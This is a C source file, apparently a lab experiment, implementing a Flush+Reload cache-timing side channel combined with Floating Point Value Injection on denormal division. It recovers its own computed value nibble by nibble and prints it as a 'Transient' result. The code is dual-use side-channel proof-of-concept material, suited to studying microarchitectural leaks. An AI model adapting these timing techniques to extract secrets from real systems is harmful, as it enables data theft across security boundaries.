#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include <x86intrin.h>

#include "asm.h"

#define NUM_SAMPLES 10000
#define NUM_ITERATIONS 1000
#define ROUNDS 10


uint64_t measure_access(unsigned char* addr, int is_miss) {
    uint64_t min_time = UINT64_MAX;
    
    for(int i = 0; i < ROUNDS; i++) {
        if(is_miss) {
            clflush(addr);
        } else {
            *(volatile char*)addr; 
        }
        mfence();
        
        uint64_t start = rdtscp();
        *(volatile char*)addr;
        lfence();
        uint64_t end = rdtscp();
        
        uint64_t delta_t = end - start;
        if(delta_t < min_time) {
            min_time = delta_t;
        }
    }
    
    return min_time;
}

uint64_t get_cache_threshold(){
    uint64_t hits = 0;    
    uint64_t misses = 0;   
    uint64_t delta_t;

    unsigned char test_line[64];
    test_line[0] = 1;

    *(volatile char*)test_line;
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 0);
        hits += delta_t;
    }

    clflush(test_line);
    mfence();

    for(int i =0; i < NUM_SAMPLES; i++) {
        delta_t = measure_access(test_line, 1);
        misses += delta_t;
    }

    uint64_t hit_avg = hits / NUM_SAMPLES;
    uint64_t miss_avg = misses / NUM_SAMPLES;
    uint64_t threshold = (miss_avg + hit_avg) / 2;
 
    return threshold;
}

uint64_t get_reload_time(unsigned char *addr) {
    mfence();
    uint64_t start = rdtscp();
    *(volatile char*)addr;
    lfence();
    uint64_t end = rdtscp();
    
    uint64_t delta_t = end - start;
    return delta_t;
}


double make_denormal() {
    uint64_t rand_val;
    asm volatile("rdrand %%rax" : "=a"(rand_val));
    rand_val &= 0x000FFFFFFFFFFFFFULL;
    
    if (rand_val == 0) rand_val = 1;  // Avoid zero
    
    return *(double*)&rand_val;
}



int main(int argc, char *argv[]) {
    int CACHE_THRESHOLD = get_cache_threshold();
    int STRIDE = 4096;
    int ITERATIONS = 100;
    int RELOADBUFFER_SIZE = 16 * STRIDE;  // Solo 16 cache lines!

    unsigned char *reloadbuffer = aligned_alloc(4096, RELOADBUFFER_SIZE);
    memset(reloadbuffer, 0, RELOADBUFFER_SIZE);
    
    printf("CACHE THRESHOLD = %d cycles\n", CACHE_THRESHOLD);

    double dX = make_denormal();
    double dY = make_denormal();
    
    printf("dX = 0x%016lx\n", *(uint64_t*)&dX);
    printf("dY = 0x%016lx\n", *(uint64_t*)&dY);
    printf("\n");
    
    uint8_t leaked[16];  // 16 nibbles (8 bytes * 2 nibbles per byte)
    
    // Loop su tutti 16 nibbles
    for (int nibble_index = 0; nibble_index < 16; nibble_index++) {
        int nibble_hit_tracker[16] = {0};  // Solo 16 possibili valori!

        for (int i = 0; i < ITERATIONS; i++) {
            // 1. Flush (solo 16 cache lines!)
            for (int j = 0; j < 16; j++) {
                clflush(&reloadbuffer[j * STRIDE]);
            }
            mfence();

            // 2. FPVI
            double z;
            asm volatile(
                "movsd %[x], %%xmm0\n"
                "movsd %[y], %%xmm1\n"
                "divsd %%xmm1, %%xmm0\n"
                "divsd %%xmm1, %%xmm0\n"
                "movsd %%xmm0, %[z]\n"
                : [z] "=m" (z)
                : [x] "m" (dX), [y] "m" (dY)
                : "xmm0", "xmm1"
            );

            // Estrai nibble
            int byte_index = nibble_index / 2;  // Quale byte (0-7)
            int is_high = nibble_index % 2;      // Low nibble (0) o high nibble (1)
            
            uint8_t byte = ((uint8_t*)&z)[byte_index];
            uint8_t nibble = is_high ? (byte >> 4) : (byte & 0x0F);
            
            // Accedi cache
            *(volatile char*)(&reloadbuffer[nibble * STRIDE]);

            // 3. Reload (solo 16!)
            for(int j = 0; j < 16; j++) {
                uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
                if(reload_time < CACHE_THRESHOLD) {
                    nibble_hit_tracker[j]++;
                }
            }
        }

        // Find most hit nibble
        int most_hit_nibble = 0;
        int max = 0;
        for(int i = 0; i < 16; i++) {
            if(nibble_hit_tracker[i] > max) {
                max = nibble_hit_tracker[i];
                most_hit_nibble = i;
            }
        }

        leaked[nibble_index] = most_hit_nibble;
        printf("Nibble %2d: 0x%x - %.1f%%\n", nibble_index, most_hit_nibble, 100.0 * max / ITERATIONS);
    }
    
    // Ricostruisci il valore (16 nibbles = 8 bytes)
    printf("\nTransient: 0x");
    for(int i = 15; i >= 0; i--) {
        printf("%x", leaked[i]);
    }
    printf("\n");

    free(reloadbuffer);
    return 0;
}